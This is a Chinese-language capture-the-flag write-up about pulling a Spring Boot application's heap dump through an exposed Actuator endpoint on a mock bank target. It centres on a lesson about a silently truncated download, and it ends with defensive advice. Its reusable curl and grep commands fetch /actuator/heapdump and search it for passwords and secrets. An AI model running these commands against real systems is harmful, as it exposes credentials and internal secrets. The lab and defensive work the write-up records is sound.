# 08 · Breaking into a Major Bank —— 全项目最深的一课：别在残缺证据上下结论

> 系列第 8 题 · 对应真实事件：金融机构调试端点暴露泄露凭据与内部秘密（原赏金 $4,800）
> · 我的净耗时：约 50 分钟（其中约 20 分钟在一个错误的结论边缘徘徊）

## 题面

> Modern applications often expose debugging and monitoring endpoints that
> developers forget to lock down in production. These endpoints can leak far
> more than performance metrics - sometimes they dump the entire application's
> memory.

靶场地址：`https://<REDACTED_DOMAIN>/`（一个 Spring Boot 银行应用）

## 我的判断路径

"dump the entire application's memory" 几乎明示了 Spring Boot Actuator 的
`/actuator/heapdump`。我的计划：确认 Actuator 暴露面 → 下载堆转储 →
字符串提取搜索凭据。技术上没有难点——难点藏在传输层。

## 过程

### 1. Actuator 全家桶裸奔确认

```
GET /actuator          → 端点索引 JSON（heapdump/env/beans/mappings/configprops/
                          threaddump/loggers/scheduledtasks/caches 全部列出）
GET /actuator/env      → Spring Boot 3 默认脱敏，所有值显示 ******
GET /actuator/mappings → 挖出应用本体：com.wiz.controller.BankingController
                          → /api/accounts（返回账户 JSON，但不含 flag）
```

一切指向 heapdump。

### 2. 下载堆转储：一个静默的陷阱

```
curl -o heap.hprof https://<REDACTED_DOMAIN>/actuator/heapdump   # --max-time 30
```

命令"成功"返回，没有任何报错。我拿到的文件 1.5MB，
开头是合法的 `JAVA PROFILE 1.0.2` HPROF 头——**看起来完全正常**。

### 3. 在残缺数据上分析了 20 分钟

我在这个 1.5MB 文件里做了能做的一切：

- ASCII 字符串提取 + `WIZFLAG`/`password`/`secret` 模式匹配 → 全是 JVM 内部符号
- 怀疑 Java 字符串以 UTF-16 存储 → 构造含空字节的搜索模式 → 报出数千行"命中"
- 觉得不可信，换 PowerShell 做字节级扫描复核 → **真实命中数为 0**
  （后来查明：shell 根本无法传递 `\x00` 参数，模式在半路被截断，数千行"命中"
  是匹配了裸字母的假阳性）
- 字符串按长度排序人工审阅 → 模块描述符、向量 API 签名……纯粹的 JVM 噪音

我开始倾向一个错误结论："这个堆转储是个罐头装饰文件，flag 不在这里。"

### 4. 两个反常细节 + 一次完整性校验救了场

其实证据早就摆在眼前，我注意到得太晚：

- `loggers` 端点显示应用里明明有 `com.wiz.BankApplication`、Spring 框架类一片——
  **可堆里连一个 `springframework` 字符串都没有**（`grep -c` 为 0）。
  一个活着的 Spring 应用堆里不可能没有框架类。矛盾成立。
- 于是我做了一件一开始就该做的事——**对比服务器声称的大小**：

```
curl -sI .../actuator/heapdump | grep -i content-length
→ Content-Length: 29,928,163        ← 服务器说 29.9MB
ls -l heap.hprof → 1,523,356        ← 我手里只有 1.5MB
```

**下载被静默截断了。** 之前所有"没找到"的结论只在残缺的 5% 数据上成立。

### 5. 完整下载，一遍命中

加大超时重新下载完整 29.9MB，第一遍特征搜索直接命中：
flag 在堆内偏移 7,552,043 处的字符串里（`<REDACTED>`）。

## 失败与弯路（全项目最深刻的一课，值得单独一节）

1. **在二进制证据上做分析前，先校验完整性**（Content-Length / 哈希 / 文件尾结构）。
   截断是静默的，残缺数据会产生"看起来合理"的错误结论
2. **注意矛盾证据**：loggers 里有 Spring、堆里没有——这个矛盾出现的第一时间
   就该触发怀疑，而不是在字符串堆里硬挖
3. **单一工具的正结论要交叉验证**：shell 传不了空字节这个坑制造了大量假命中，
   换 PowerShell 字节级扫描才把真相钉住。反直觉但真实：**复核的价值不低于初筛**

## 关键命令（脱敏后结构可复用）

```bash
URL="https://<REDACTED_DOMAIN>/actuator"

curl -sI "$URL/heapdump" | grep -i content-length     # 先问服务器有多大
curl -s --max-time 240 -o heap.hprof "$URL/heapdump"  # 按实际大小给足超时
ls -l heap.hprof                                       # 对账

# 字符串提取 + 特征搜索（HPROF 里的字符串多为类名/常量，printable 提取即可覆盖）
tr -c '[:print:]' '\n' < heap.hprof | grep -aiE "WIZFLAG|password|secret" | sort -u
```

## 防御视角（如果我是蓝队）

1. **Actuator（尤其 env/heapdump/threaddump）在生产环境必须禁用或挂严格鉴权**——
   `management.endpoints.web.exposure.include=*` 是事故级配置
2. 堆转储 = 内存快照 = 密码、密钥、会话、内部 URL 的全家福；即使需要开，
   也应限制源 IP + 审计日志 + 短期保留
3. WAF/网关层直接封禁 `/actuator/**` 外部访问是最低成本的一刀
4. 换位思考：蓝队也该做"假设泄露"演练——如果堆被拿走，里面最致命的是什么？

## 证据

- `evidence/08-1-flag-submitted.png` —— 提交成功页面
- 完整 30MB 堆转储原文件按脱敏规范未入库，以命令输出文字替代
